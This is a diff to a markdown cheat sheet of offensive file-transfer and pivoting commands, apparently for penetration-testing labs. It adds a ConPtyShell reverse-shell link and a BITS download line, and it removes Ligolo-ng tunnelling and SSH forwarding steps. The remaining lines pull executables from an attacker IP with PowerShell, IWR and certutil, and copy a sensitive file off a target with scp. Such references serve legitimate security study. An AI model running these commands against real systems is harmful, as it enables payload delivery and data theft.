@@ -96,6 +96,11 @@ IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/file.exe','C:\temp
 Invoke-WebRequest -Uri http://10.10.14.5/file.exe -OutFile C:\temp\file.exe
 ```
 
+## ConPtyShell (Source)
+```
+https://github.com/antonioCoco/ConPtyShell
+```
+
 ## Download file using PowerShell one-liner
 
 ```powershell
@@ -188,43 +193,6 @@ scp user@$IP:/tmp/sensitive_file.txt .
 scp -P 2222 file.exe user@$IP:/tmp/
 ```
 
-## Start Ligolo-ng proxy on attacker
-
-```bash
-./proxy -selfcert
-```
-
-## Connect Ligolo-ng agent from target
-
-```bash
-./agent -connect 10.10.14.5:11601 -ignore-cert
-```
-
-## Start Ligolo-ng tunnel session
-
-```bash
-session
-start
-```
-
-## Add route for Ligolo-ng tunnel
-
-```bash
-ip route add 192.168.1.0/24 dev ligolo
-```
-
-## Create SSH local port forward
-
-```bash
-ssh -L 8080:internal_host:80 user@$IP
-```
-
-## Create SSH dynamic SOCKS proxy
-
-```bash
-ssh -D 9050 user@$IP
-```
-
 ## Verify file hash on Linux
 
 ```bash
@@ -245,17 +213,23 @@ certutil -hashfile file.exe SHA256
 file file.exe
 ```
 
-## Quick PowerShell download with IWR
+## Powershell download with Start-BitsTransfer
+```
+powershell -c "Start-BitsTransfer -Source 'http://10.10.14.5/file.exe' -Destination 'C:\Temp'"
+```
+
+## PowerShell download with IWR
 
 ```powershell
 powershell -c "iwr http://10.10.14.5/file.exe -o file.exe"
 ```
 
-## Quick certutil download on Windows
+## Certutil download on Windows
 
 ```cmd
 certutil -urlcache -f http://10.10.14.5/file.exe file.exe
 ```
+
 
 ## Transfer file using base64 over netcat
 
